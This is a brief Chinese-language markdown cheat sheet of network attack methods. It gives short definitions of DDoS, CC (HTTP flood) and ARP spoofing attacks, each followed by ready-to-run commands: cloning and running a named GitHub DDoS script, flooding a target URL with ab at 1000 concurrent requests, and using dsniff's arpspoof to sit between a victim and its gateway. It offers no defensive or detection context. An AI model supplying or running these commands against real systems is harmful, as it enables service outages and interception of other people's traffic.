##  网络攻击手段

### DDoS攻击
分布式拒绝服务攻击，通过大量请求使目标服务器瘫痪

```bash
# 下载攻击工具
git clone https://github.com/Andysun06/ddos
cd ddos
python ddos-p2.py
```

---

### CC攻击
Challenge Collapsar攻击，针对Web应用的DDoS变种

```bash
# 使用ab工具进行CC攻击
ab -n 1000 -c 1000 http://target.com/
```

---

### ARP欺骗
通过伪造ARP报文，实现中间人攻击

```bash
# 安装dsniff工具
apt-get install dsniff -y
arpspoof -i eth0 -t 目标IP 网关IP
```
